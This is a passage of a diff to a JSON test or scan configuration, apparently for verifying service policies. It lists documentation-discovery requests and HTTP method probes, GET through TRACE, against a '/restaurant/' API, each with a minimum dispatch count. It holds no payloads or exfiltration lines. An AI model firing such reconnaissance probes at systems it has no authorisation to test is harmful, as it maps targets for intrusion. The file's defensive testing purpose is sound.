+            "method": "GET",
+            "path": "/restaurant/openapi.json",
+            "payload_class": "documentation-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "docs-3",
+            "method": "GET",
+            "path": "/restaurant/swagger",
+            "payload_class": "documentation-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "method-GET",
+            "method": "GET",
+            "path": "/restaurant/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "method-POST",
+            "method": "POST",
+            "path": "/restaurant/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "method-PUT",
+            "method": "PUT",
+            "path": "/restaurant/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "method-DELETE",
+            "method": "DELETE",
+            "path": "/restaurant/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "method-PATCH",
+            "method": "PATCH",
+            "path": "/restaurant/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "method-OPTIONS",
+            "method": "OPTIONS",
+            "path": "/restaurant/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "method-HEAD",
+            "method": "HEAD",
+            "path": "/restaurant/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "method-TRACE",
+            "method": "TRACE",
+            "path": "/restaurant/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "service-policy-verify/01-service-policy-deny",
